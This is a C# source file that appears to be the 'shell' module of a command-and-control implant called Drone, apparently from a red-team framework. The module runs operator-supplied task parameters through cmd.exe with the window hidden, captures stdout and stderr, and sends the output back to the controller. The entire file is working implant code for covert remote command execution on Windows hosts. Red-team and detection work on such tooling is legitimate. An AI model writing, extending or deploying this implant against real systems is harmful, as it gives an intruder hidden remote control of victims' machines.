using System.Diagnostics;
using System.IO;
using System.Text;

using Drone.Models;

namespace Drone.Functions;

public class Shell : DroneFunction
{
    public override string Name => "shell";
    
    public override void Execute(DroneTask task)
    {
        var sb = new StringBuilder();

        using var process = new Process
        {
            StartInfo = new ProcessStartInfo
            {
                FileName = @"C:\Windows\System32\cmd.exe",
                Arguments = $"/c {string.Join(" ", task.Parameters)}",
                CreateNoWindow = true,
                WindowStyle = ProcessWindowStyle.Hidden,
                WorkingDirectory = Directory.GetCurrentDirectory(),
                UseShellExecute = false,
                RedirectStandardOutput = true,
                RedirectStandardError = true
            }
        };

        process.OutputDataReceived += (_, args) => { sb.AppendLine(args.Data); };
        process.ErrorDataReceived += (_, args) => { sb.AppendLine(args.Data); };

        process.Start();
        process.BeginOutputReadLine();
        process.BeginErrorReadLine();
        process.WaitForExit();
        
        Drone.SendOutput(task.TaskId, sb.ToString().TrimEnd());
    }
}